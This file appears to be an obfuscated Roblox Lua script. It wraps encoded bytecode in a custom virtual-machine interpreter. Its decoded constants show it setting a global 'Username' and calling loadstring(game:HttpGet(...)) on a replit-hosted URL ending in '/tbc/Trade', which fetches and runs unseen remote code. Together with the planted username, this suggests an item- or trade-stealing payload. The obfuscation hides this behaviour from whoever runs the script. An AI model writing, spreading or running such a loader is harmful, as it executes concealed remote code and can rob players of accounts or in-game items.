local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v24,v25)local v26={};for v41=1, #v24 do v6(v26,v0(v4(v1(v2(v24,v41,v41 + 1 )),v1(v2(v25,1 + (v41% #v25) ,1 + (v41% #v25) + 1 )))%256 ));end return v5(v26);end local v8=tonumber;local v9=string.byte;local v10=string.char;local v11=string.sub;local v12=string.gsub;local v13=string.rep;local v14=table.concat;local v15=table.insert;local v16=math.ldexp;local v17=getfenv or function()return _ENV;end ;local v18=setmetatable;local v19=pcall;local v20=select;local v21=unpack or table.unpack ;local v22=tonumber;local function v23(v27,v28,...)local v29=1;local v30;v27=v12(v11(v27,5),v7("\156\185","\18\178\151\147"),function(v42)if (v9(v42,2)==79) then v30=v8(v11(v42,1,2 -1 ));return "";else local v102=v10(v8(v42,16));if v30 then local v108=0;local v109;while true do if (v108==1) then return v109;end if (v108==0) then v109=v13(v102,v30);v30=nil;v108=1;end end else return v102;end end end);local function v31(v43,v44,v45)if v45 then local v103=(v43/(2^(v44-1)))%((4 -2)^(((v45-1) -(v44-1)) + 1)) ;return v103-(v103%1) ;else local v104=0;local v105;while true do if (v104==0) then v105=2^(v44-1) ;return (((v43%(v105 + v105))>=v105) and 1) or 0 ;end end end end local function v32()local v46=0;local v47;while true do if (v46==1) then return v47;end if (v46==0) then v47=v9(v27,v29,v29);v29=v29 + (2 -1) ;v46=1;end end end local function v33()local v48=0;local v49;local v50;while true do if (0==v48) then v49,v50=v9(v27,v29,v29 + 2 );v29=v29 + (3 -1) ;v48=1;end if (v48==1) then return (v50 * (659 -403)) + v49 ;end end end local function v34()local v51=0;local v52;local v53;local v54;local v55;while true do if (v51==0) then v52,v53,v54,v55=v9(v27,v29,v29 + 3 );v29=v29 + 4 ;v51=1;end if (1==v51) then return (v55 * (16777835 -(555 + 64))) + (v54 * 65536) + (v53 * 256) + v52 ;end end end local function v35()local v56=v34();local v57=v34();local v58=1;local v59=(v31(v57,1,20) * ((3 -1)^32)) + v56 ;local v60=v31(v57,952 -(857 + 74) ,31);local v61=((v31(v57,32)==1) and  -(1 + 0)) or (1 -0) ;if (v60==0) then if (v59==0) then return v61 * (0 + 0) ;else v60=569 -(367 + 201) ;v58=0;end elseif (v60==2047) then return ((v59==0) and (v61 * ((792 -(368 + 423))/0))) or (v61 * NaN) ;end return v16(v61,v60-1023 ) * (v58 + (v59/(2^52))) ;end local function v36(v62)local v63=0;local v64;local v65;while true do if (3==v63) then return v14(v65);end if (v63==1) then v64=v11(v27,v29,(v29 + v62) -1 );v29=v29 + v62 ;v63=2;end if (2==v63) then v65={};for v110=1, #v64 do v65[v110]=v10(v9(v11(v64,v110,v110)));end v63=3;end if (0==v63) then v64=nil;if  not v62 then v62=v34();if (v62==0) then return "";end end v63=1;end end end local v37=v34;local function v38(...)return {...},v20("#",...);end local function v39()local v66={};local v67={};local v68={};local v69={v66,v67,nil,v68};local v70=v34();local v71={};for v79=928 -(214 + 713) ,v70 do local v80=0;local v81;local v82;while true do if (v80==1) then if (v81==1) then v82=v32()~=0 ;elseif (v81==2) then v82=v35();elseif (v81==(1 + 2)) then v82=v36();end v71[v79]=v82;break;end if (v80==0) then v81=v32();v82=nil;v80=1;end end end v69[1 + 2 ]=v32();for v83=1,v34() do local v84=0;local v85;while true do if (v84==0) then v85=v32();if (v31(v85,1,1)==(0 -0)) then local v119=v31(v85,2,3);local v120=v31(v85,4,6);local v121={v33(),v33(),nil,nil};if (v119==0) then v121[3]=v33();v121[4]=v33();elseif (v119==(1638 -(1523 + 114))) then v121[3]=v34();elseif (v119==2) then v121[3]=v34() -(2^16) ;elseif (v119==3) then local v133=0;while true do if (v133==0) then v121[11 -8 ]=v34() -((444 -(416 + 26))^16) ;v121[4]=v33();break;end end end if (v31(v120,1,1)==(3 -2)) then v121[2]=v71[v121[2 + 0 ]];end if (v31(v120,2 -0 ,2)==1) then v121[3]=v71[v121[3]];end if (v31(v120,3,2 + 1 )==1) then v121[4]=v71[v121[4]];end v66[v83]=v121;end break;end end end for v86=1,v34() do v67[v86-(1066 -(68 + 997)) ]=v39();end return v69;end local function v40(v73,v74,v75)local v76=v73[1];local v77=v73[3 -1 ];local v78=v73[3];return function(...)local v88=v76;local v89=v77;local v90=v78;local v91=v38;local v92=1;local v93= -(439 -(145 + 293));local v94={};local v95={...};local v96=v20("#",...) -1 ;local v97={};local v98={};for v106=0 -0 ,v96 do if (v106>=v90) then v94[v106-v90 ]=v95[v106 + 1 ];else v98[v106]=v95[v106 + 1 ];end end local v99=(v96-v90) + 1 ;local v100;local v101;while true do local v107=0;while true do if (v107==0) then v100=v88[v92];v101=v100[1];v107=1;end if (1==v107) then if (v101<=33) then if (v101<=16) then if (v101<=(124 -(32 + 85))) then if (v101<=3) then if (v101<=1) then if (v101>0) then local v136=v100[2];local v137=v98[v100[3 + 0 ]];v98[v136 + 1 ]=v137;v98[v136]=v137[v100[4]];elseif (v98[v100[1488 -(998 + 488) ]]==v100[4]) then v92=v92 + 1 ;else v92=v100[3];end elseif (v101==2) then local v141=0;local v142;while true do if (0==v141) then v142=v100[1 + 1 ];do return v21(v98,v142,v93);end break;end end else for v247=v100[2],v100[3] do v98[v247]=nil;end end elseif (v101<=(5 + 0)) then if (v101>4) then local v143=0;local v144;local v145;local v146;while true do if (1==v143) then v146=v98[v144 + 2 ];if (v146>0) then if (v145>v98[v144 + 1 ]) then v92=v100[3];else v98[v144 + (775 -(201 + 571)) ]=v145;end elseif (v145<v98[v144 + (1139 -(116 + 1022)) ]) then v92=v100[3];else v98[v144 + 3 ]=v145;end break;end if (v143==0) then v144=v100[2];v145=v98[v144];v143=1;end end else v92=v100[3];end elseif (v101>6) then local v148=v100[2];local v149=v98[v100[1 + 2 ]];v98[v148 + 1 ]=v149;v98[v148]=v149[v100[4]];else local v153=v100[2];v98[v153]=v98[v153](v21(v98,v153 + 1 + 0 ,v93));end elseif (v101<=(40 -29)) then if (v101<=9) then if (v101==8) then v98[v100[959 -(892 + 65) ]][v100[3]]=v98[v100[4]];else do return v98[v100[2]]();end end elseif (v101==10) then v98[v100[2]]=v98[v100[3]]%v100[4] ;else v92=v100[3];end elseif (v101<=13) then if (v101>12) then local v159=0;local v160;while true do if (v159==0) then v160=v100[2];do return v98[v160](v21(v98,v160 + 1 ,v100[3]));end break;end end else v98[v100[2]]={};end elseif (v101<=14) then v98[v100[4 -2 ]]();elseif (v101==15) then do return v98[v100[2]]();end else local v257=0;local v258;local v259;local v260;local v261;while true do if (v257==0) then v258=v100[7 -5 ];v259,v260=v91(v98[v258](v98[v258 + 1 ]));v257=1;end if (v257==1) then v93=(v260 + v258) -(1 -0) ;v261=859 -(814 + 45) ;v257=2;end if (v257==2) then for v349=v258,v93 do local v350=0;while true do if (v350==0) then v261=v261 + 1 ;v98[v349]=v259[v261];break;end end end break;end end end elseif (v101<=24) then if (v101<=20) then if (v101<=18) then if (v101==17) then v98[v100[2]]= #v98[v100[3]];else local v163=0;local v164;while true do if (v163==0) then v164=v100[2];v98[v164]=v98[v164](v21(v98,v164 + 1 ,v93));break;end end end elseif (v101==19) then local v165=0;local v166;while true do if (v165==0) then v166=v100[2];do return v21(v98,v166,v93);end break;end end else local v167=0;local v168;local v169;local v170;local v171;while true do if (v167==1) then v93=(v170 + v168) -1 ;v171=0;v167=2;end if (2==v167) then for v315=v168,v93 do local v316=0;while true do if (v316==0) then v171=v171 + 1 ;v98[v315]=v169[v171];break;end end end break;end if (v167==0) then v168=v100[2];v169,v170=v91(v98[v168](v21(v98,v168 + 1 ,v93)));v167=1;end end end elseif (v101<=22) then if (v101==21) then local v172=v100[2];local v173,v174=v91(v98[v172](v21(v98,v172 + 1 ,v93)));v93=(v174 + v172) -1 ;local v175=0;for v249=v172,v93 do local v250=0;while true do if (v250==0) then v175=v175 + 1 ;v98[v249]=v173[v175];break;end end end elseif v98[v100[2]] then v92=v92 + 1 ;else v92=v100[7 -4 ];end elseif (v101>23) then v98[v100[2]]=v98[v100[3]]%v100[7 -3 ] ;elseif  not v98[v100[2]] then v92=v92 + 1 ;else v92=v100[3];end elseif (v101<=28) then if (v101<=26) then if (v101>25) then local v177=0;local v178;while true do if (v177==0) then v178=v100[2];v98[v178](v21(v98,v178 + 1 + 0 ,v93));break;end end elseif ((v100[3]==v7("\69\169\211\122","\164\26\236\157\44")) or (v100[3]==v7("\75\74\79\44\23\66\89","\114\44\47\59\74"))) then v98[v100[2]]=v75;else v98[v100[2]]=v75[v100[3]];end elseif (v101==(377 -(87 + 263))) then if ((v100[3]==v7("\59\150\11\231","\181\100\211\69\177")) or (v100[3]==v7("\14\206\163\92\12\197\161","\58\105\171\215"))) then v98[v100[182 -(67 + 113) ]]=v75;else v98[v100[2]]=v75[v100[3]];end else for v251=v100[2],v100[3] do v98[v251]=nil;end end elseif (v101<=(11 + 19)) then if (v101==29) then local v179=0;local v180;while true do if (v179==0) then v180=v100[2 + 0 ];v98[v180](v21(v98,v180 + 1 ,v93));break;end end else local v181=0;local v182;local v183;local v184;while true do if (v181==2) then for v319=1,v100[4] do v92=v92 + 1 ;local v320=v88[v92];if (v320[1]==53) then v184[v319-1 ]={v98,v320[3]};else v184[v319-1 ]={v74,v320[3]};end v97[ #v97 + (1081 -(1020 + 60)) ]=v184;end v98[v100[2]]=v40(v182,v183,v75);break;end if (0==v181) then v182=v89[v100[3]];v183=nil;v181=1;end if (1==v181) then v184={};v183=v18({},{[v7("\202\214\136\76\229\124\237","\25\149\137\225\34\129")]=function(v322,v323)local v324=0;local v325;while true do if (0==v324) then v325=v184[v323];return v325[1][v325[2]];end end end,[v7("\197\208\62\249\195\128\60\254\234\40","\82\154\143\80\156\180\233")]=function(v326,v327,v328)local v329=0;local v330;while true do if (v329==0) then v330=v184[v327];v330[1][v330[2]]=v328;break;end end end});v181=2;end end end elseif (v101<=31) then local v185=v100[2];v98[v185]=v98[v185]();elseif (v101>32) then v98[v100[2]]=v100[3];else v98[v100[2]][v100[3]]=v98[v100[4]];end elseif (v101<=(1473 -(630 + 793))) then if (v101<=41) then if (v101<=37) then if (v101<=35) then if (v101>34) then local v187=0;local v188;local v189;local v190;while true do if (1==v187) then v190=v98[v188] + v189 ;v98[v188]=v190;v187=2;end if (v187==0) then v188=v100[2];v189=v98[v188 + 2 ];v187=1;end if (v187==2) then if (v189>0) then if (v190<=v98[v188 + 1 ]) then local v364=0;while true do if (v364==0) then v92=v100[3];v98[v188 + 3 ]=v190;break;end end end elseif (v190>=v98[v188 + (3 -2) ]) then local v365=0;while true do if (v365==0) then v92=v100[7 -4 ];v98[v188 + (14 -11) ]=v190;break;end end end break;end end else local v191=0;local v192;local v193;local v194;while true do if (v191==2) then for v331=1,v100[4] do local v332=0;local v333;while true do if (v332==1) then if (v333[1]==53) then v194[v331-1 ]={v98,v333[3]};else v194[v331-(1 + 0) ]={v74,v333[3]};end v97[ #v97 + 1 ]=v194;break;end if (v332==0) then v92=v92 + 1 ;v333=v88[v92];v332=1;end end end v98[v100[954 -(802 + 150) ]]=v40(v192,v193,v75);break;end if (v191==0) then v192=v89[v100[2 + 1 ]];v193=nil;v191=1;end if (1==v191) then v194={};v193=v18({},{[v7("\12\52\65\64\57\0\217","\210\83\107\40\46\93\101\161")]=function(v334,v335)local v336=0;local v337;while true do if (v336==0) then v337=v194[v335];return v337[1][v337[2]];end end end,[v7("\233\191\32\55\193\137\32\54\211\152","\82\182\224\78")]=function(v338,v339,v340)local v341=0;local v342;while true do if (v341==0) then v342=v194[v339];v342[1][v342[2]]=v340;break;end end end});v191=2;end end end elseif (v101==36) then local v195=0;local v196;local v197;local v198;local v199;while true do if (v195==0) then v196=v100[2];v197,v198=v91(v98[v196](v21(v98,v196 + 1 ,v100[3])));v195=1;end if (2==v195) then for v343=v196,v93 do local v344=0;while true do if (0==v344) then v199=v199 + (3 -2) ;v98[v343]=v197[v199];break;end end end break;end if (v195==1) then v93=(v198 + v196) -1 ;v199=0;v195=2;end end elseif  not v98[v100[5 -3 ]] then v92=v92 + 1 ;else v92=v100[3];end elseif (v101<=39) then if (v101>(68 -30)) then local v200=v100[2];local v201,v202=v91(v98[v200](v21(v98,v200 + 1 ,v100[1750 -(760 + 987) ])));v93=(v202 + v200) -(1914 -(1789 + 124)) ;local v203=0;for v253=v200,v93 do v203=v203 + 1 ;v98[v253]=v201[v203];end else v98[v100[2]]=v74[v100[769 -(745 + 21) ]];end elseif (v101==(14 + 26)) then v98[v100[2]]=v100[3 + 0 ];else v98[v100[2]]=v100[3] + v98[v100[4]] ;end elseif (v101<=45) then if (v101<=(117 -74)) then if (v101==(164 -122)) then v98[v100[2]]=v74[v100[3]];else local v211=0;local v212;local v213;local v214;while true do if (v211==0) then v212=v100[999 -(915 + 82) ];v213=v98[v212 + 2 ];v211=1;end if (v211==2) then if (v213>0) then if (v214<=v98[v212 + (2 -1) ]) then local v373=0;while true do if (0==v373) then v92=v100[3];v98[v212 + 1 + 2 ]=v214;break;end end end elseif (v214>=v98[v212 + 1 ]) then local v374=0;while true do if (v374==0) then v92=v100[3];v98[v212 + 3 + 0 ]=v214;break;end end end break;end if (v211==1) then v214=v98[v212] + v213 ;v98[v212]=v214;v211=2;end end end elseif (v101>44) then local v215=0;local v216;while true do if (0==v215) then v216=v100[2];v98[v216]=v98[v216]();break;end end else local v217=v100[2];v98[v217]=v98[v217](v21(v98,v217 + 1 ,v100[3]));end elseif (v101<=47) then if (v101>46) then v98[v100[2 + 0 ]]=v98[v100[13 -10 ]][v100[4]];else v98[v100[2]]= #v98[v100[3]];end elseif (v101<=48) then v98[v100[2]]=v98[v100[3]] + v100[4] ;elseif (v101>49) then do return;end else v98[v100[2 + 0 ]]=v98[v100[3]]%v98[v100[4]] ;end elseif (v101<=58) then if (v101<=54) then if (v101<=52) then if (v101>51) then v98[v100[2]]=v98[v100[3]]%v98[v100[4]] ;else local v224=0;local v225;local v226;local v227;while true do if (v224==1) then v227=v98[v225 + 2 ];if (v227>0) then if (v226>v98[v225 + 1 ]) then v92=v100[3];else v98[v225 + 3 ]=v226;end elseif (v226<v98[v225 + 1 ]) then v92=v100[6 -3 ];else v98[v225 + 3 ]=v226;end break;end if (v224==0) then v225=v100[2];v226=v98[v225];v224=1;end end end elseif (v101==53) then v98[v100[2]]=v98[v100[3]];else local v230=0;local v231;local v232;while true do if (v230==1) then for v345=v231 + 1 ,v93 do v15(v232,v98[v345]);end break;end if (v230==0) then v231=v100[2];v232=v98[v231];v230=1;end end end elseif (v101<=56) then if (v101>55) then v98[v100[2]]=v98[v100[3]][v100[4]];else v98[v100[2]]=v100[3] + v98[v100[1417 -(447 + 966) ]] ;end elseif (v101==(155 -98)) then local v236=0;local v237;while true do if (v236==0) then v237=v100[2];do return v98[v237](v21(v98,v237 + (1818 -(1703 + 114)) ,v100[3]));end break;end end else v98[v100[2]]=v98[v100[3]] + v100[4] ;end elseif (v101<=62) then if (v101<=60) then if (v101==(760 -(376 + 325))) then if (v98[v100[2]]==v100[4]) then v92=v92 + (1 -0) ;else v92=v100[3];end else v98[v100[2]]();end elseif (v101==61) then v98[v100[5 -3 ]]=v98[v100[3]];else local v241=0;local v242;local v243;while true do if (0==v241) then v242=v100[2];v243=v98[v242];v241=1;end if (v241==1) then for v346=v242 + 1 ,v93 do v15(v243,v98[v346]);end break;end end end elseif (v101<=64) then if (v101>(82 -19)) then local v244=v100[2];v98[v244]=v98[v244](v21(v98,v244 + 1 + 0 ,v100[1190 -(1069 + 118) ]));elseif v98[v100[2]] then v92=v92 + 1 ;else v92=v100[3];end elseif (v101<=65) then v98[v100[2]]={};elseif (v101==66) then local v278=0;local v279;local v280;local v281;local v282;while true do if (v278==2) then for v353=v279,v93 do local v354=0;while true do if (v354==0) then v282=v282 + 1 ;v98[v353]=v280[v282];break;end end end break;end if (v278==1) then v93=(v281 + v279) -1 ;v282=14 -(9 + 5) ;v278=2;end if (v278==0) then v279=v100[4 -2 ];v280,v281=v91(v98[v279](v98[v279 + 1 ]));v278=1;end end else do return;end end v92=v92 + 1 ;break;end end end end;end return v40(v39(),{},v28)(...);end v23("LOL!0D3O0003063O00737472696E6703043O006368617203043O00627974652O033O0073756203053O0062697433322O033O0062697403043O0062786F7203053O007461626C6503063O00636F6E63617403063O00696E7365727403053O006D6174636803083O00746F6E756D62657203053O007063612O6C00243O00121B3O00013O0020385O000200121B000100013O00203800010001000300121B000200013O00203800020002000400121B000300053O0006250003000A0001000100040B3O000A000100121B000300063O00203800040003000700121B000500083O00203800050005000900121B000600083O00203800060006000A00062200073O000100062O00353O00064O00358O00353O00044O00353O00014O00353O00024O00353O00053O00121B000800013O00203800080008000B00121B0009000C3O00121B000A000D3O000622000B0001000100052O00353O00074O00353O00094O00353O00084O00353O000A4O00353O000B4O003D000C000B4O0009000C00014O0002000C6O00433O00013O00023O00023O00026O00F03F026O00704002264O000C00025O001221000300014O002E00045O001221000500013O0004050003002100012O002A00076O003D000800024O002A000900014O002A000A00024O002A000B00034O002A000C00044O003D000D6O003D000E00063O00203A000F000600012O0024000C000F4O0012000B3O00022O002A000C00034O002A000D00044O003D000E00014O002E000F00014O0034000F0006000F001037000F0001000F2O002E001000014O003400100006001000103700100001001000203A0010001000012O0024000D00104O0014000C6O0012000A3O000200200A000A000A00022O00420009000A4O001D00073O000100042B0003000500012O002A000300054O003D000400024O0039000300044O000200036O00433O00017O00043O00027O004003053O003A25642B3A2O033O0025642B026O00F03F001C3O0006225O000100012O00268O002A000100014O002A000200024O002A000300024O000C00046O002A000500034O003D00066O0003000700074O0024000500074O003600043O0001002038000400040001001221000500024O002C000300050002001221000400034O0024000200044O001200013O000200262O000100180001000400040B3O001800012O003D00016O000C00026O0039000100024O000200015O00040B3O001B00012O002A000100044O0009000100014O000200016O00433O00013O00013O00093O0003073O0067657467656E7603083O00557365726E616D65030D3O00E4D0DE37E8BACA1BEEEBDE37E303083O007EB1A3BB4586DBA7030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403553O00682O7470733A2O2F61303564323732342D636230332D342O62372D616635642D3239336338343336653231322D2O302D336339796B61733668646C34662E72696B65722E7265706C2E636F2F7462632F5472616465026O00F03F01133O00063F3O001100013O00040B3O0011000100121B000100014O002D0001000100022O002A00025O001221000300033O001221000400044O002C00020004000200100800010002000200121B000100053O00121B000200063O002001000200020007001221000400084O0024000200044O001200013O00022O003C00010001000100040B3O0012000100203800013O00092O00433O00017O00",v17(),...);

